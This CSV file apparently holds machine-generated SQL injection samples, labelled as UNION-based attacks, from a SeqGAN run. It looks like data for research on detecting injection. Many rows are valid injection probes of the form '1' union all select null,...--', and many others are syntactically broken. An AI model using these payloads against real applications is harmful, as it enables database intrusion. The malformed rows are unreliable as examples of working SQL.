label,payload,family,payload_type,method,run_id,sample_index
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1684
attack,"1""   )    )    )    )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1685
attack,"1'  )   union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1686
attack,"1' union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1687
attack,"1' union all select null,null,null,null,null,null,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1688
attack,"1'  )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1689
attack,"1' union all select  7230,9346,1249,8067,7230,9346,1249,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1690
attack," 27741' union all select  8067,8067,8067,4909,8067,8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1691
attack,"1'  )   union select * from usio' where null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1692
attack,"1'   )    )    )    )    )    )    union 7815 all where null 5145SIO(    )    )    )   -- mlat  )    where id  =  1980 union all 7348,8067,8067,8067-- 1646  (           )    )    )   -- lwhere where 5145 from  8885,d  (        )    -- all where 80671047  (  (    )    )    --  )    )   --)    )   -- v",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1693
attack,"1' union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1694
attack,"1'  )   union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1695
attack,"1"" union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1696
attack,"1'  )   union all where null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1697
attack,"1  )    )    )    )    )    )lwhere id  =  1646 union all 9357t o where 390050875087,3900,9346,1646,5087,50875087,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1698
attack,"1""   )    )    )    )    )    )    )    where 1839  =  =  1 union all select 3820,7230,5087,3900,3900,5087,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1699
attack,"1'  )   union all select 8979,4273,4273,4273,4273,7845,4273,4273--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1700
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1701
attack,"1""   )    )    )    )    )    )    )    where id  =  2774 union all select from 5145 ,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1702
attack,"1'   )    )    )    )    )    )    )    )    where 2774  * all where 8067,9347,3900,9347,null,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1703
attack,"1"" union all select 1839,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1704
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1705
attack,"1'""   )    )    )    )    )    )    )    )     )   union where null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1706
attack,1' union all select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1707
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null  ,null,1276,5087,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1708
attack,"1"" )    union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1709
attack,"1""   )    )    )    )    )    )    where l null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1710
attack,"1' union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1711
attack,"1""   )    )    )    )    )    )    union all select null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1712
attack,1'  )   union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1713
attack," select * from u where from from u where from usiolwhere where 3480,1917-- from from u where 3741-- from where 5145 null,9347,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1714
attack,"1'   )    )    )    )    )    )    )    union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1715
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1716
attack,"1'  )   union all select 4481,6962,8890,4481--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1717
attack,"1""   )    )    )    )    )    )    union all select null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1718
attack,"1 union all where null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1719
attack,"1'   )    )    )    )    )    )    )    where 7815  =  1494 union all  4266-- 5145  (      (    )    )    --  (    )    )    )    )    --  (    )    )    )    --)    )   -- limidmmide mmolwhere 3900,5087,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1720
attack,"1' union all select 5087,null,3900,2285#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1721
attack,"1'   )    )    )    )    )    )    )    where 8890  =  )      (  =  8890 union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1722
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1723
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1724
attack,"1'  union' all where null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1725
attack,"1' union all select 80673900,3900,3900,3900,5087,3900,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1726
attack,1'+  (  select 'er where null-- from where from from 4966 from 1047 from ut all where 5145 from ut where 1917  (  (    )   -- all where 6700  (  (    )    )    -- m1249--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1727
attack,"1' union all select null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1728
attack,1' union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1729
attack,"1'  )   union all null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1730
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null8391,8067,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1731
attack,1'   )    )    )    )    )    )    )    )    where null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1732
attack,"1'  )    )    )    )    where select null,l,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1733
attack,"1""   )    )    )    )    )    )    )    where  all where 3990",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1734
attack,"1' union all select null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,"1'  )   union all select null,null,null,null null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,"1""   )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
attack,"1'  )   union all select  1249,1249,1441,3339,1249,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1738
attack,"1'  )   union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1739
attack,"1' 1 union all )ers where id  =  (  )    )    --   )    )    )    )    -- all where 3900,5087,5087,3900--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1740
attack,"1'   )   unionall select select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1741
attack,"1' union all select 8067,8067,8067,1249,8067,3900,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1742
attack,"1'   )    )    )    )    )    )    where 2774  =  select union all union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1743
attack,"1""   )    )    )    )    )    )    union all where null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1744
attack,1' union all select 8123--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1745
attack,"1""   )    )    )    )    )    where ilaah where 6737  ((    )    )    )    )   --)    )   -- all where null where 1917  (    )    )    )--  (    )    )    )    )    --  (    e)   )    )    )   -- all where 5145 8692,5087,9110#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1746
attack,"1'  )   union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1747
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1748
attack,"1' union all "" AND 1  =  0 UNION ALL SELECT "",3900,3900,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1749
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1750
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1751
attack,"1  )   union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1752
attack,"1'""   )   union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1753
attack,"1' union all select  9777,8067,8067,4266,8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1754
attack,"1'  )   union all select 5087  ,9945,5087,5087,5087,9945,5087,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1755
attack,"1"" where null-- union where from 1494 where from 5145 null,null,null,null,null,null,d#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1756
attack,"1'  )   union all select nulla,null,null,2132,1845,1845--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1757
attack,"1' union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1758
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1759
attack,"1'   )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1760
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1761
attack,"1'  )   union all select 1276,null,null,null,8067,null,8890#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1762
attack,"1"" union all where null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1763
attack,"1  )   union all select 8067,8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1764
attack,"1'  )   union all select null,2132,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1765
attack,"1' union select from where 4191,3900,3900,3900,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1766
attack,"1' union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1767
attack,"1'   )    )    )    )    )    )    )    where 5870  =  2334 union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1768
attack,"1'  )    )    )    )    )    )    where 5925  =  )      2774 union all select null null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1769
attack,"1'  )   union select * from 5145 null,7348,8067,8885,1310,2263#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1770
attack,1'  )   where 1494  (  (  (    )   -- )    --  (    )    )    --)    )    )    --  (    )   -- )    -- all where where 5145-- from 6700#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1771
attack,"1""   )    )    )    )    )    union all select null null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1772
attack,"1' union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1773
attack,"1"" union all null null,8890,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1774
attack," select * from us where where 6700  (  (    )   --  (    )    )    )    )--   -- union  (    )    )    )    where null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1775
attack,"1'   )    )    )    )    )    )    where 5870  =  5870 union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1776
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1777
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1778
attack,"1' union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1779
attack, select * * from ut where 3900d  =  )       I -- -- where  from where where 5145 --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1780
attack,"1' union all select o 3900,3900,3900,3900,3900,3900,3900,3900,1646#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1781
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1782
attack,"1' 8986  (    )   -- all where from where from where from where 5145 -- 6621  (    )   -- ltd where 5145 1917  (  (    )   --  (    )   -- all where 1980  (  (  (    )    --  )    )    )    )    --)    )    )    )   --# 16461646  )   -- union where  -- from where where 1368,vera where id  =  1917 union all select 7381,1917-- from where all null-- * from where",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1783
attack,"1'   )    )    )    )    )    )    )    )    union where all null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1784
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1785
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1786
attack,"1'   )   union all 6621  (  (    )    )   -- 2878  (    )    )    )    -- v   -- where from t 7230--  -- from where -- 3900,8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1787
attack,"1'""   )    )    )    )    )    )    where 8890  =  )2878 union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1788
attack,"1' union "" AND 1  =  0 UNION ALL SELECT ""aa where null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1789
attack,1  )   union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1790
attack,"1 union all select 9110 3900,9945,8067,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1791
attack,"1' union all select null-- 9322,6996,9346,3900--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1792
attack,"1' v)   1d  (    )    )    )    )    )    --  )    )    )    )    )    )    -- v--S where 1646  (    )    )    union from 7381 6700  (    )    --   )    )   --  (    )   )    where 8890  ,2334   ,null,1646#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1793
attack,"1'   )    )    )    )    )    )    )    union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1794
attack,"1' union all where 7497,1845,1845,1845,1845,1845,1845,1845#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1795
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1796
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1797
attack,"1'  )   union all select null,null   ,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1798
attack,"1' union all where null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1799
attack,"1 union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1800
attack,"1'  )   union where 2088  =  (  )   union all where null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1801
attack,"1' union all select 8099  ,3900,2132,8231#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1802
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1803
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1804
attack,"1'  )   union all null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1805
attack,"1   )   union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1806
attack,"1'   )    )    )    )    )    )    )    union all select 2334,6021,8890#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1807
attack,"1'""   )    )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1808
attack,"1'  )   union all select  8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1809
attack,1'  )    )    )    )    )    )    where ola where 1047  =  198019808986-- all where where 5145-- 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1810
attack,"1'  )   1494  )    )    )    union all select 1646,5349--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1811
attack,"1"" union all null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1812
attack,"1'""   )    )    )    )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1813
attack,"1' union all select 5349,1249,3081,4273,8123,2263,1297,6962#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1814
attack,"1""   )    )    )    )    )    where 5870  =  8890 union all select null-- 5145 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1815
attack,"1""9945   where where 5145,3059,5087,9347#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1816
attack,"1"" union all where 1845,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1817
attack,"1'""   )    )    )    )    i   union all select null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1818
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1819
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1820
attack,"1""   )    )    )    )    )    )    union all where null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1821
attack," select * from us where 5145 2571,9110,8123  ,9110#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1822
attack,"1""   )    )    )    )    )    )    al)    )    where where 5870  =  9517 where@ m8986--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1823
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1824
attack,"1""   )    )    )    )    where lililah where 1047  =  )   -- all all where where from u-- 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1825
attack,"1' % 1845,1845,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1826
attack,"1' union all select where  3900,null,8067,9346,9945,1646,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1827
attack,"1""   )    )    )    )    )    )    where 5870  =  1646 union all select 9346,4273,4273,4273,3900,8123,9346--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1828
attack,"1'  )   union all select 9945,6962,9110,7230#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1829
attack,1'' union all where null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1830
attack,"1'  )   union all select null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1831
attack,"1'   )    )    )    )    )    i)    union all select 4300,2334a,2446,2446,2446,2446,2446,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1832
attack,"  1'  )   union all select  3900,3900,3900,3900,3900,3900,4909,3900,3900,9346,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1833
